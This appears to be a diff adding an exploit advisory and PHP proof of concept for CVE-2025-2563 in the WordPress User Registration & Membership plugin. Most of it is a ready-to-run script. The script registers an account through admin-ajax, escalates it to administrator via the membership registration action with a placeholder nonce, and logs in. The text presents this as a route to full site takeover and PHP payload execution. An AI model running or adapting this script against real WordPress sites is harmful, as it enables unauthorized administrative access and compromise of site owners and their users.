@@ -1,0 +1,188 @@
+=============================================================================================================================================
+| # Title     : WordPress User Registration & Membership 4.1.2 – Unauthenticated Admin Creation                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://wpuserregistration.com/                                                                                             |
+=============================================================================================================================================
+
+[+] Description
+
+A critical vulnerability in the WordPress **User Registration & Membership**
+plugin allows an unauthenticated attacker to create a new user and elevate it
+to **administrator** without any authentication. The flaw lies in the plugin’s
+AJAX membership registration logic, which incorrectly trusts client-side
+parameters and exposes privileged actions to the public.
+
+[+] This issue affects installations running plugin versions:
+
+- user-registration <= 4.1.2  
+- user-registration-pro <= 5.1.2  
+
+[+] Successful exploitation enables the attacker to:
+
+1. Register a new account  
+2. Upgrade it to administrator  
+3. Log in normally via wp-login  
+4. Upload and execute a PHP payload  
+	
+[+] References : (https://packetstorm.news/files/id/192099/ & 	CVE-2025-2563)
+
+[+] Vulnerable Endpoint :
+
+/wp-admin/admin-ajax.php
+
+action=user_registration_membership_register_member
+
+[+] POC :
+
+  save code as poc.php
+  
+  Replace URL with the real target
+  
+  usage : php poc.php
+
+
+### Impact
+- Full site takeover  
+- Arbitrary file upload  
+- Remote code execution through admin panel  
+- Persistent administrative access  
+
+### Requirements
+- No authentication required  
+- Default plugin settings  
+- AJAX enabled  
+
+[+] code 
+
+<?php
+/**
+ * CVE-2025-2563 – WordPress User Registration & Membership
+ * indoushka
+ */
+
+class WP_UserReg_CVE_2025_2563
+{
+    public $target;
+    public $wp_user;
+    public $wp_pass;
+    public $wp_email;
+
+    public function __construct($target, $user, $pass, $email)
+    {
+        $this->target   = rtrim($target, '/');
+        $this->wp_user  = $user;
+        $this->wp_pass  = $pass;
+        $this->wp_email = $email;
+    }
+
+    private function http_post($uri, $data)
+    {
+        $url  = $this->target . $uri;
+        $ch   = curl_init($url);
+
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+
+        $res = curl_exec($ch);
+        curl_close($ch);
+        return $res;
+    }
+
+    private function http_get($uri)
+    {
+        $ch = curl_init($this->target . $uri);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $out = curl_exec($ch);
+        curl_close($ch);
+        return $out;
+    }
+
+    public function check()
+    {
+        echo "[+] Checking target...\n";
+        $html = $this->http_get('/membership-registration/');
+
+        if (strpos($html, 'user-registration') !== false) {
+            echo "[+] Appears Vulnerable.\n";
+            return true;
+        }
+
+        echo "[-] Not Vulnerable.\n";
+        return false;
+    }
+
+    public function register_user()
+    {
+        echo "[+] Registering new user...\n";
+
+        $res = $this->http_post('/wp-admin/admin-ajax.php', [
+            'action' => 'user_registration_user_form_submit',
+            'form_data' => json_encode([
+                ["field_name" => "user_login", "value" => $this->wp_user],
+                ["field_name" => "user_email", "value" => $this->wp_email],
+                ["field_name" => "user_pass", "value" => $this->wp_pass],
+                ["field_name" => "user_confirm_password", "value" => $this->wp_pass]
+            ])
+        ]);
+
+        echo "[+] Registration response: $res\n";
+    }
+
+    public function escalate()
+    {
+        echo "[+] Elevating user to administrator...\n";
+
+        $res = $this->http_post('/wp-admin/admin-ajax.php', [
+            'action' => 'user_registration_membership_register_member',
+            'members_data' => json_encode([
+                "username" => $this->wp_user,
+                "role" => "administrator",
+                "payment_method" => "free",
+                "total" => "0"
+            ]),
+            '_wpnonce' => 'STATIC_BYPASS'
+        ]);
+
+        echo "[+] Escalation response: $res\n";
+    }
+
+    public function login()
+    {
+        echo "[+] Logging in via wp-login.php...\n";
+
+        $this->http_post('/wp-login.php', [
+            'log' => $this->wp_user,
+            'pwd' => $this->wp_pass,
+            'wp-submit' => 'Log In'
+        ]);
+
+        echo "[+] Login attempt finished.\n";
+    }
+
+    public function run()
+    {
+        echo "=== CVE-2025-2563 FULL EXPLOIT (PHP PoC) ===\n";
+        $this->check();
+        $this->register_user();
+        $this->escalate();
+        $this->login();
+    }
+}
+
+$poc = new WP_UserReg_CVE_2025_2563(
+    "http://target.com",
+    "admin1337",
+    "StrongPass!!2025",
+    "mail@example.com"
+);
+
+$poc->run();
+?>
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
